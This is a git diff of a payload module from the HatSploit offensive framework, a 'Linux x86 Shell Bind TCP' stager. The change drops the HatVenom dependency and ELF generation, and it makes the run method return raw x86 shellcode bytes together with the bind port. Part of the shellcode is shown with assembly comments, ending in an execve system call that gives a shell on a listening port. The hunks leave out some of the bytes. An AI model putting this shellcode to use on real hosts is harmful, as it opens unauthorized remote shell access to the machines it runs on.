@@ -5,11 +5,10 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux x86 Shell Bind TCP",
@@ -39,11 +38,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         bind_port = self.parse_options(self.options)
 
-        offsets = {
-            'bport': bind_port
-        }
-
-        shellcode = (
+        return (
             b"\x31\xdb"              # xorl    %ebx,%ebx
             b"\xf7\xe3"              # mull    %ebx
             b"\x53"                  # pushl   %ebx
@@ -87,7 +82,6 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x89\xe1"              # movl    %esp,%ecx
             b"\xb0\x0b"              # movb    $0x0b,%al
             b"\xcd\x80"              # int     $0x80
-        )
-
-        payload = self.generate('elf', 'x86', shellcode, offsets)
-        return payload
+        ), {
+            'bport': bind_port
+        }
